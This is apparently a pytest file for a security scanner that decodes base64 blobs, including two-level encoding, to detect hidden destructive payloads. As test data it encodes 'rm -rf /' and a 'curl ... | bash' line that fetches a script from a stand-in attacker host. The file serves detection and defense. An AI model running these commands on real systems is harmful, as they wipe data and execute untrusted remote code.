import base64
from sentinel.deobfuscate import rescan_encoded, _find_b64_blobs


def test_finds_b64_blob():
    payload = base64.b64encode(b"rm -rf /").decode()
    blobs = _find_b64_blobs(f"data = '{payload}'")
    assert payload in blobs


def test_decoded_payload_surfaces_destructive():
    payload = base64.b64encode(b"rm -rf /").decode()
    findings = rescan_encoded(f"run('{payload}')", "x.py")
    assert any(f["category"] == "destructive" for f in findings)
    assert any(f["rule"].startswith("[decoded]") for f in findings)


def test_layered_base64_two_levels():
    inner = base64.b64encode(b"curl http://evil.test/s.sh | bash").decode()
    outer = base64.b64encode(inner.encode()).decode()
    findings = rescan_encoded(f"x='{outer}'", "x.py", depth=2)
    assert any(f["category"] == "destructive" for f in findings)


def test_clean_text_no_findings():
    assert rescan_encoded("just a normal sentence here", "x.md") == []


def test_short_b64_like_words_ignored():
    # ordinary words must not be treated as payloads
    assert rescan_encoded("the quick brown fox", "x.md") == []
